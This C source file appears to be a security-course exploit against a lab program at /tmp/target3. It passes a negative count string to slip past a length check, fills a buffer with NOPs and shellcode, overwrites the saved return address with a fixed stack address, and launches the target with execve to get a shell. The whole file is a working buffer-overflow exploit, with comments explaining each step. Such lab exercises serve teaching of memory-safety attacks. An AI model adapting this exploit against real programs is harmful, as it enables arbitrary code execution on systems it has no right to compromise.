#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET 	"/tmp/target3"
#define SIZE  		5640
#define BUF_SIZE	5609
#define BOF_SIZE  	5621
#define NOP                  0x90

int main(void)
{
	char *args[3];
  	char *env[1];

  	char over_buf[SIZE];
	int i, n;
      //Count: it is negative to by pass check and is small to overflow
	char * addr;
	addr = "-2147483447,";


      //Follows common structure of a overflow
  	for(i=0; i < SIZE; i++){
  		*(over_buf + i) = NOP;
  	}
  	for(i=0; i < strlen(addr); i++){
  		*(over_buf + i) = addr[i];
  	}
      //SHELLCODE
  	n =0;
	for(i=BUF_SIZE+ strlen(addr)-strlen(shellcode)-9; i < BUF_SIZE+ strlen(addr)-9; i++){
  		*(over_buf + i) = shellcode[n++];
  	}

      //Overwrites the EIP, now points to buffer 
  	*(over_buf + BUF_SIZE+ strlen(addr)-5) = '\x78';
  	*(over_buf + BUF_SIZE+ strlen(addr)-4) = '\xd2';
  	*(over_buf + BUF_SIZE+ strlen(addr)-3) = '\xff';
  	*(over_buf + BUF_SIZE+ strlen(addr)-2) = '\xbf';

 	args[0] = TARGET; args[1] = over_buf; args[2] = NULL;
 	env[0] = NULL;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

  	return 0;
}
